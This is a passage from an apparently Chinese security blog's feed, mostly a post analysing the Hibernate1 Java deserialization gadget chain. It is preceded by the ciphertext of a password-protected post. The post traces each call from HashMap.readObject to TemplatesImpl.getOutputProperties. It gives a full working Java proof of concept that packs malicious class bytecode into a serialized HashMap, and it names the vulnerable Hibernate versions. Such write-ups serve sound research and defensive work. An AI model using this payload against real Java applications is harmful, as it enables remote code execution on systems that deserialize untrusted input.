cc39793367a881399c0269a0d911d2dcf6c66ea6d928bb8322fc243286ae18d2c444b2857a8142e41da7b11c99ed5b7832870685b0a19d8bd13ff3cc653f47e8c0a1bb9c83d3cc8ef86f62988c49f2d6b4430bd26830a3e88c4fb2529f0d6cf84532f30c45179ab85a141c91aa45ab1dea1897f430a89c7cbfb3c8d0d7f79e65a49c14ff3dee3faaf76203737ad5e3799029ef530f5c7a47dca89aa879d48a614ab950149818acae248a422105d76b495332ceffa4ea158e162379772f0102b55f31c19e693a37c9013af2b346b168f3c97deca19021396cb5445df26b0420751e34b20e06559834e7d093ecc0a528ddc0ed579f6c371599ba0d917a0e737f842a84f780294a8357f90b9b2f195f3aad7493978245c7c3af6e9c98f4bb61be530aefed48739a4716f7d4f490cbb5dea7ad2e91a5b0c79b15b58a2bb1c3fb206b25bdb51435a4eb1f16480c8b4538391735ec682ba64852f852d0dea9953d82b58b61d792a3a8924741db8b8784e2ae089e554f97a3504e14a69c774c23e2b96af5837a0f0837ffcdb09f7c3980a3d723ede3893843568fb4eab14d2312913b6046e3fc0e2188f6090e6517786f4b9eda882e1698ac9abab204995aa10777e307d7c93b38841e8c411b92d47bad43abab012175628636e490bbef93dedc6af354f924721cb37b4dc6dd1372a6576913009c233e358d46e560b7ab36bba824e89d8f5956374246e5c601e0715b387b22f082c838aa51c95bdd8fd755cd472eb14f56e708b5942211dc9bc0b6d06ed19cafe58c88217943aa48aaadcc882857ce49351741a4156a7b540257ab94ea8224d3e43ade28088633ccebab1a37e73655bae4c0c294b8b0c813b72f17dd337a1a7b63a6aa2bf535bbb22c7900fe151b46a5805c5ad73f09aed4aaaead8e01234ba7263bf657d09df9a3101cab73ab1c79e8681e785a71cc25df1252f01e677865913fc4f6e1a3773d4d71219bd3c82f7fb63163d5bc19717f9a59673475ad6ac93992454511ac8714c08c3b1ea59e962dee29a6163592dbe4bf862e1c731d9c0a5d113d6466108653bdce192a01e5f5302eca93a0fa8341c1b98bdd933a4081f5b06931ce531ab168380f6c3a4ad9c07482066b79e15c986961959a1b06b1156182c17756e16cbd3a41ebc0f8a95fcaaed15b8f8464fdf14f946a0e31d2091988a2405dc275153508c177a70a06b3bd1a4f5738a6524f5f0d3682feb06e5493bfb98c192c1d43fd05bd3dcce918ccfe00f185239bb563635107c82618e66705f0d0ba952414744238e89f9ea79068767bfca8d62c400c00ffb035d543f81313dbd4fe7e753c4fe53cb1418b930f32ffb8e9f32dd3cf5700520c031992a86dba5c902bd507e5e7b4a8a68d948f7c573458264bb518de75e19a58412ea4fcd6a7d6fac4c93ebb45db1d7058fd917a200748a90e5be6e96491e6c97a83295414c93511f7f5aa992eea6c94caa1f8167dcd5c9dade7feeee850c5f88cfb25da629bbe404f42ae75149b243968cc9df6947a658c080733e88ab085ed29eca85bf491021f3aace421f78b18b258497db28c804b6c09e49527dade87595668434beea689ec75d990145befba051e2fadf1dd8b5cd56d31b04bb64a990efea8766cb69641b30f78c420da71edff1bc5429c238a2e0a5bde60a3b24338d5913db128ab58a7439b60f6e4d0d072974b3a8239ccf467fe0fb2e3acaf09cc2641a8a475572463121a21e4695b73e320be1e91755f6b871b416f72c99be2efe613e5aac410f1774b93fc5713f97a608bd1c33dd6ec9ae02cee26b59fe6b79e9fb70b340ebd811ac7973fe3478845d8374ebe808455f212e7b5a175868438fba5b71c656b68092f6a646c29fb2d6d394fefc67553d942df19995c1d52e5b016101f1aa69782ae8f0b46a7ebc204351194dafd090e603a68c1aa79d2be7441c8437a84e6ea7450a39c19dffb0751fb4002e1c0dc2e5269a0691c0865186b5d36d9d56b851257612368e2d15b757a2fc60ea0609e258a24d980bb768f9d2a1ba879e497c7d94fc7d5fda9230bd37b662504cf6b8ccf1974633a0890707fe27f9f8bc1543a31c6529c5112a07bf33a309f74f5683f3e7eae5f5dbd2e1c656d7d6c8f6bf188f1bcea650d521418c47e21d16febc2e097901ef6755d946a2d399129557e75be0b7488a61934ae168c0e5aa9e13e1f22dbfdc3d13b463e2c2019d2dd1f7423329334a8135b2c5a51e4f33927bcb9a543cf0cee88cd7675229b0f0a1edc2744e511d22cd403f0432ad61ed44a090c2cea360f040460f3894a9e4640d754110427cd8a7d0f688bc9a21abe6adb3c3849f871ffb3caf80491788132cded9c9f1d2abdea527f3af93270d43bfbe76f3c584e4f09cde8966887ebf2b7f402fbde324af49782a06614607e4a87b79e475c44b2bdab312dbb3fd2d39b0b242820ffc24149bbdb27ffecb79338fa1a588643e66aebb9745a31b1e9ee1c211f67fcf30e65abb2e435a81a92992c923054ad43366673107d8b230214498cc321f7cbbb286efffea53f79bc4711e11a24dc129ca4e9a578981e0d2800c2640473a665b0b3ae0ed1d7a9e27ede9250e85cdc42a12f7faeb9260e06fb91702b0026438acc74699a2b2056862b863f0470a3602942d66138b09f21f7f24657fc8403a5f8bdecbd1b8f7700613ad8a7a538613f72ceedaa4f143c7a5e7e415797c41ce89c31c554b2269d676ea10ee402071c57f3deb8b75cb4de98fb233645b3645d0e1799fc29a26e174b92b1db55ee301b92e5fcc843594b62c5aae5950af6287e99f74ddc44e704b06995365f4be14ae4aab2b6cadc81b02c7de14dae8d55d996cc418bb4ea3f8527dfc0dbadfaa10daaa9ab43e0baba3bcbe3ed1ad1716ce7d31f8161b3aa589a3c15ef33358a5e111afa33cb4a72fa89a3785f62f94c9249b4b8ec0d877cebbae5ab2d1405739956f6914e7fa9d9d70841ecfb77057b0bd5b15958d8fa44ca94e82effe38fb95c16a8a51266fcc7c43b61a183746b22260e847808f44079b56b01567d14edfcd84932a4554ad6feb985d94ea0feeb47f201df968476cc1dc1c850626d57857090f15bc25fa034c38d445094fad441523bd10fb0762f1782999ab4766f366e205d076e37a92d08f33b45692534a3ed5089ba34a17b65f38c4bf51875b7a3fe80cd60ece847c2c22f01113537989cee3ed2788ef9bb1fdde7595038800d2f5b4483255ab354e1fc6e8459dd8ac567793a21f6cd38b94a1ab33a555c4ab066cffeec18b43a219237a7d862f93579fbe8a20d167288acdd5a33f502ae621ed9e6869eb7e26c57538650e0adfaea6e8ed8654a1649d4cf904fe1f2994f105341f8c225ab30ef647e9395acc5f3201773a9df156b5d2d645177a6dc3637b920b84c5accfad092fd2ce46093ab2fd99e294e56651c63b0a97d04b1f37c9ebf5200159b5a09e78a329c8960beddcc5a8f093e02cb2d0e73d44775630de9a1cba028afd9d6bcf077f56b6f3165505fd982dd606aaa7d1cab61d084c92de82e861c750a7492495a429c00733298f51468bff3bb68773fe893d0499ef92f92084edbcf7b0bed513c1cbdd9fd9ea2e73bea567eca97e71150e9f38302a7781608ca698981c2196423c39eb379f317393b37ec755a5a14006d33647c2f06ce9f3e52f1eb6a4d505ba1b980c1e72cf3a97dd6d98d1cda66a43951f6796222f6f7c24d3927c7fb25f208933decac45e2321a928f0bb4a59019810856d5afe753d440be394d3856e38c20336e566c953c0fe40c575593ad4517d759fe58985c3d0d8c3699be589b25bc9698de020f9452281694eb434bee144a4fd9644a48080dd3c4fd002d396f9e60f5c4bcf1cb7175eee5ae539aa757ee92a2c6961a084a9a1a1a3af9fd8ef4cc46968a3a31c6ede8b6ab7673833451081e5ae57e87ea81d521196f811187f1a321245633fe8e08b980ffd866a4fb14089852f85f6f5286fe0a387bdd41ff5f042d39fa3dc80d9d22a6159ea8d592f818cc8a92a2039cb7fd4c49326f92c1771636088df963824344d6e06a673f9a313ef5f056b3cdd7f7ec806ff0ef91a39cb8754e0171f31b922582daf1110528980d9b34dceeb205de660f434d8b4a06694282637e8f53e3276d60f3fbe1c62404d9cc97690f2d4160b01cc53ca6d6262da6af0fa013d9be2afa41ce92932191a7c9ff2b52cff871f696ff0c705f01f333cdf2cc961c83495b7894589d76775a6ee65a59c94410e6ccddc1e10ce2f2f91d9aa9497fce345422ea840</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-XXE" scheme="https://ke1nys.github.io/tags/show-XXE/"/>
    
  </entry>
  
  <entry>
    <title>java-Hibernate</title>
    <link href="https://ke1nys.github.io/posts/3531a825.html"/>
    <id>https://ke1nys.github.io/posts/3531a825.html</id>
    <published>2023-07-11T14:07:32.000Z</published>
    <updated>2023-07-19T11:38:38.086Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://boogipop.com/2023/04/02/%E6%88%91%E6%9D%A5%E5%AF%B9Hibernate%E5%88%A9%E7%94%A8%E9%93%BE%E8%AF%B4%E4%B8%80%E4%BA%8C/">参考链接1 </a>       <a href="https://su18.org/post/ysoserial-su18-3/#hibernate1">参考链接2</a></p><h2 id="Hibernate1"><a href="#Hibernate1" class="headerlink" title="Hibernate1"></a>Hibernate1</h2><p>这也是可以通过调用任意getter函数来进行代码执行的一个类</p><p><strong>首先先给上调用栈</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">    TypedValue.hashCode()</span><br><span class="line">        ValueHolder.getValue()</span><br><span class="line">            ValueHolder.DeferredInitializer().initialize()</span><br><span class="line">                ComponentType.getHashCode()</span><br><span class="line">            PojoComponentTuplizer.getPropertyValue()</span><br><span class="line">                        AbstractComponentTuplizer.getPropertyValue()</span><br><span class="line">                            BasicPropertyAccessor$BasicGetter.get()/GetterMethodImpl.get()</span><br><span class="line">                                TemplatesImpl.getOutputProperties()</span><br></pre></td></tr></table></figure><p><strong>我们还是老样子 从能够执行命令的地方开始分析</strong></p><p><code>BasicPropertyAccessor#get</code>  方法</p><p><img src="../images/image-20230711230854168.png" alt="image-20230711230854168"></p><p>这个的话是可以调用任意方法</p><p><strong>这里可控的两点就是<code>method</code>和这个<code>target</code>参数</strong></p><p><code>BasicPropertyAccessor#BasicGetter</code>  方法</p><p><img src="../images/image-20230711231133798.png" alt="image-20230711231133798"></p><p>这个类的构造方法是可以设置这个<code>method</code>方法的</p><p><code>BasicPropertyAccessor#creatGetter</code>  方法</p><p><img src="../images/image-20230711231410524.png" alt="image-20230711231410524"></p><p>跟进这个方法</p><p><code>BasicPropertyAccessor#getGetterOrNull</code>   方法</p><p><img src="../images/image-20230711231507249.png" alt="image-20230711231507249"></p><p>接着跟进这个方法</p><p><code>BasicPropertyAccessor#getterMethod</code>  方法</p><p><img src="../images/image-20230711231538300.png" alt="image-20230711231538300"></p><ul><li>首先第一步就是先获取到这个<code>theClass</code>这个类里的所有方法</li><li>然后判断这些方法是是否存在参数  如果存在参数的话就退出</li><li>接着就判断无参数的方法是否是<code>get</code>或者<code>is</code>开头的</li><li>如果满足以上条件的话就将get或is后面的东西转化为小写并返回</li></ul><p><img src="../images/image-20230711231914096.png" alt="image-20230711231914096"></p><p>在<code>BasicPropertyAccessor#getterMethod</code>执行完后  就会将method进行返回  然后就返回<code>BasicGetter</code>的构造方法  这样的话就给<code>method</code>给配置完成了</p><p><strong>知道上述的东西参数怎么配置完之后  我们就得找找谁能调用这个<code>get</code>方法</strong></p><p>经过查找发现在抽象类<code>org.hibernate.tuple.component.AbstractComponentTuplizer</code>中定义了成员变量getters，并且通过<code>getPropertyValue()</code>方法调用get方法,而<code>getPropertyValues()</code>又调用了<code>getPropertyValue()</code></p><p>​    <img src="../images/image-20230711232825523.png" alt="image-20230711232825523"></p><p>就是这两个方法</p><p><strong>接着找谁调用了<code>getPropertyValues</code>()方法，由于这是抽象类，因此该找实现类哪里调用了</strong></p><p><strong>但是抽象类我们无法调用，只能使用它的子类，</strong><code>AbstractComponentTuplizer</code> 有两个子类，一个是 <code>PojoComponentTuplizer</code>，一个是 <code>DynamicMapComponentTuplizer</code>，这对应着 <code>Hibernate</code> 的实体对象的类型，即 <code>pojo</code> 和 <code>dynamic-map</code>。<code>pojo</code> 代表将 <code>Hibernate</code> 类型映射为 Java 实体类，而 <code>dynamic-map</code> 将映射为 Map 对象。</p><p>这里选择 <code>PojoComponentTuplizer</code> 类，他的 <code>getPropertyValues()</code> 方法会调用其父类的此方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object[] getPropertyValues(Object component) <span class="keyword">throws</span> HibernateException &#123;</span><br><span class="line">        <span class="keyword">if</span> (component == BackrefPropertyAccessor.UNKNOWN) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="built_in">this</span>.propertySpan];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.optimizer != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.optimizer.getAccessOptimizer() != <span class="literal">null</span> ? <span class="built_in">this</span>.optimizer.getAccessOptimizer().getPropertyValues(component) : <span class="built_in">super</span>.getPropertyValues(component);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230712114037350.png" alt="image-20230712114037350"></p><p><strong>这里就是会调用到父类里的<code>getPropertyValues</code>方法</strong></p><p>而这个方法在<code>ComponentType</code>中又被调用</p><p><img src="../images/image-20230713002720265.png" alt="image-20230713002720265"></p><p>这里让<code>componentTuplizer</code>为<code>PojoComponentTuplizer</code>即可接上链子，而在该类的<code>getHashcode</code>方法中又调用了<code>getPropertyValue</code></p><p><img src="../images/image-20230713004928706.png" alt="image-20230713004928706"></p><p>此现在该着哪里可以接上<code>getHashcode</code>，这里就再正向分析一波，首先找到在<code>TypedValue</code>类中的<code>initTransients</code>是调用<code>getHashcode</code>了的</p><p><img src="../images/image-20230713005144028.png" alt="image-20230713005144028"></p><p>那么就接着找谁调用了这个<code>initTransients</code>   这个方法</p><p><img src="../images/image-20230713005401438.png" alt="image-20230713005401438"></p><p>最后在这个<code>ValueHolder#getValue()</code>里带调用了这个<code>initialize</code>方法</p><p><strong>那么这个<code>getValue</code>方法是在这个<code>TypedValue#hashCode()</code>方法来调用</strong></p><p><img src="../images/image-20230713005511693.png" alt="image-20230713005511693"></p><p>（这个<code>this.hashcode</code>是在调用这个<code>initialize</code>的时候来给赋值的)</p><p><img src="../images/image-20230713005654920.png" alt="image-20230713005654920"></p><p><strong>那么我们现在就走到了<code>TypedValue#hashcode</code>这个方法这里了</strong></p><p><strong>那么有经验的师傅就能想到使用<code>hashMap</code>来当入口来触发了</strong></p><p><strong>(就是最外层就是<code>hashMap</code>)</strong></p><p><strong>POC如下</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.engine.spi.TypedValue;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.type.Type;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hibernate1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;Hibernate1.bin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; componentTypeClass             = Class.forName(<span class="string">&quot;org.hibernate.type.ComponentType&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; pojoComponentTuplizerClass     = Class.forName(<span class="string">&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; abstractComponentTuplizerClass = Class.forName(<span class="string">&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成包含恶意类字节码的 TemplatesImpl 类</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tmpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(tmpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(evil.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(tmpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(tmpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Method</span>  <span class="variable">method</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredMethod(<span class="string">&quot;getOutputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Object getter;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span></span><br><span class="line">            Class&lt;?&gt;       getterImpl  = Class.forName(<span class="string">&quot;org.hibernate.property.access.spi.GetterMethodImpl&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; constructor = getterImpl.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            getter = constructor.newInstance(<span class="literal">null</span>, <span class="literal">null</span>, method);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">            <span class="comment">// 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span></span><br><span class="line">            Class&lt;?&gt;       basicGetter = Class.forName(<span class="string">&quot;org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            getter = constructor.newInstance(tmpl.getClass(), method, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tuplizer</span> <span class="operator">=</span> createWithoutConstructor(pojoComponentTuplizerClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> abstractComponentTuplizerClass.getDeclaredField(<span class="string">&quot;getters&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">getters</span> <span class="operator">=</span> Array.newInstance(getter.getClass(), <span class="number">1</span>);</span><br><span class="line">        Array.set(getters, <span class="number">0</span>, getter);</span><br><span class="line">        field.set(tuplizer, getters);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">type</span> <span class="operator">=</span> createWithoutConstructor(componentTypeClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件</span></span><br><span class="line">        setFieldValue(type,<span class="string">&quot;componentTuplizer&quot;</span>,tuplizer);</span><br><span class="line">        setFieldValue(type,<span class="string">&quot;propertySpan&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        setFieldValue(type,<span class="string">&quot;propertyTypes&quot;</span>,<span class="keyword">new</span> <span class="title class_">Type</span>[]&#123;(Type) type&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法</span></span><br><span class="line">        <span class="type">TypedValue</span> <span class="variable">typedValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypedValue</span>((Type) type, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建反序列化用 HashMap</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(typedValue, <span class="string">&quot;su18&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// put 到 hashmap 之后再反射写入，防止 put 时触发</span></span><br><span class="line">        setFieldValue(typedValue,<span class="string">&quot;value&quot;</span>,tmpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230713233831925.png" alt="image-20230713233831925"></p><p><strong>完整的利用链</strong></p><p><img src="../images/image-20230713233920372.png" alt="image-20230713233920372"></p><p><strong>这里这样写是因为版本的不同  调用链在这一块也是会不同的</strong></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li><strong>利用说明：</strong><ul><li><strong>由 HashMap 的反序列化触发 TypedValue 的 <code>hashCode</code>，调用到 ComponentType 的 <code>getHashCode</code> 方法，调用 PojoComponentTuplizer 的 <code>getPropertyValue</code> 的方法，然后使用 <code>BasicPropertyAccessor$BasicGetter</code> 调用 <code>get</code> 方法，触发 TemplatesImpl 的 <code>getOutputProperties</code> 方法。</strong></li></ul></li></ol><ol><li>依赖版本</li></ol><p><strong>Hibernate : 3-5</strong></p><ol><li><strong>本次复现用的依赖版本</strong></li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.hibernate/hibernate-core --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.hibernate<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hibernate-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.11.Final<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230713234611171.png" 